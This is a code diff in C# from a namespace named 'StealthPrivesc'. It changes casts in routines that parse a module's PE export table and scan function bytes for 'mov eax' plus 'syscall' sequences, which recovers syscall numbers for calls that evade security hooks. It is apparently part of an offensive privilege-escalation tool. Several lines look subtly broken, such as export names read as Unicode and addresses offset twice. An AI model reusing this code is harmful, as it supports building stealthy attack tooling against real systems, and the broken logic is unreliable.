@@ -33,7 +33,7 @@ namespace StealthPrivesc {
             for (int i = 0; i < header.File.Sections; i++) {
                 IntPtr ptr = IntPtr.Add(nt, 40 + i * 40);
                 var s = (Section)Marshal.PtrToStructure(ptr, typeof(Section));
-                if (rva >= (uint)s.Rva && rva < (uint)s.Rva + (uint)s.Raw) {
+                if (rva.ToInt64() >= s.Rva.ToInt64() && rva.ToInt64() < s.Rva.ToInt64() + s.Raw.ToInt64()) {
                     return IntPtr.Add(module, (int)((int)s.RawPtr + ((int)rva - (int)s.Rva)));
                 }
             }
@@ -46,29 +46,29 @@ namespace StealthPrivesc {
             IntPtr nt = IntPtr.Add(module, (int)dos.Lfanew);
             var header = (Nt)Marshal.PtrToStructure(nt, typeof(Nt));
             if (header.Magic.ToInt64() < 0x10000) { throw new Win32Exception(193); }
-            IntPtr exports = Rva((uint)header.Dirs[0].Rva);
+            IntPtr exports = Rva(header.Dirs[0].Rva);
             if (exports == IntPtr.Zero) { throw new Win32Exception(193); }
             var ed = (Exports)Marshal.PtrToStructure(exports, typeof(Exports));
             IntPtr tables = IntPtr.Zero, names = IntPtr.Zero, ords = IntPtr.Zero;
-            tables = Rva((uint)ed.Functions); names = Rva((uint)ed.Names); ords = Rva((uint)ed.Ords);
+            tables = Rva(ed.Functions); names = Rva(ed.Names); ords = Rva(ed.Ords);
             if (tables == IntPtr.Zero || (ed.Names.ToInt64() != 0 && names == IntPtr.Zero)) { throw new Win32Exception(193); }
-            for (uint i = 0; i < ed.Count; i++) {
+            for (uint i = 0; i < (uint)ed.Count.ToInt32(); i++) {
                 string function = Marshal.PtrToStringUni(IntPtr.Add(names, (int)(i * IntPtr.Size)));
                 if (function != api && !function.EndsWith(api, StringComparison.OrdinalIgnoreCase)) { continue; }
                 ushort ordinal = (ushort)Marshal.ReadInt16(IntPtr.Add(ords, (int)(i * 2)));
                 IntPtr thunk = IntPtr.Add(tables, (int)((int)ed.Base + ordinal) * IntPtr.Size);
                 IntPtr code = Marshal.ReadIntPtr(thunk);
-                if (code.ToInt64() < module.ToInt64() + 0x1000) { code = Rva((uint)code); }
+                if (code.ToInt64() < module.ToInt64() + 0x1000) { code = Rva(code); }
                 if (code == IntPtr.Zero) { continue; }
                 long address = code.ToInt64();
                 for (int offset = 0; offset < 40; offset++) {
-                    int at = address + offset;
+                    int at = unchecked((int)(address + offset));
                     if (Marshal.ReadByte(module, at) != 0xB8) { continue; }
                     int value = Marshal.ReadInt32(module, at + 1);
                     bool ok = false;
                     for (int scan = offset + 5; scan < offset + 48; scan++) {
-                        byte b = Marshal.ReadByte(module, address + scan);
-                        if (b == 0x0F && Marshal.ReadByte(module, address + scan + 1) == 0x05) { ok = true; break; }
+                        byte b = Marshal.ReadByte(module, unchecked((int)(address + scan)));
+                        if (b == 0x0F && Marshal.ReadByte(module, unchecked((int)(address + scan + 1))) == 0x05) { ok = true; break; }
                         if (b == 0xC3) { break; }
                     }
                     if (!ok) { continue; }
